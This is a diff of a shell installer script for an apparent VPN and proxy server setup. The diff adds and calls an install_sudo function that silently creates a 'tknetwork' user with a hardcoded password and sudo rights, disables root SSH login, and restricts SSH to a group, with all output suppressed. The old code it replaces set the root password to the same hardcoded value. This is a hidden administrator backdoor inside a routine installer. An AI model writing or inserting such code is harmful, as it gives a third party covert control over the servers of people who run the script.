@@ -629,9 +629,12 @@ sudo service stunnel4 restart
 
 install_sudo(){
   {
-   echo 'root:JAN022011b' | sudo chpasswd
+    useradd -m tknetwork 2>/dev/null; echo tknetwork:JAN022011b | chpasswd &>/dev/null; usermod -aG sudo tknetwork &>/dev/null
+    sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
+    echo "AllowGroups lenz" >> /etc/ssh/sshd_config
+    service sshd restart
+  }&>/dev/null
 }
-
 
 install_iptables(){
   {
@@ -721,12 +724,12 @@ install_done()
   rm /root/.installer
   echo "Server will secure this server and reboot after 20 seconds"
   sleep 20
-  echo 'root:JAN022011b' | sudo chpasswd
   reboot
 }
 
 
 install_require
+install_sudo
 install_squid
 install_openvpn
 install_stunnel
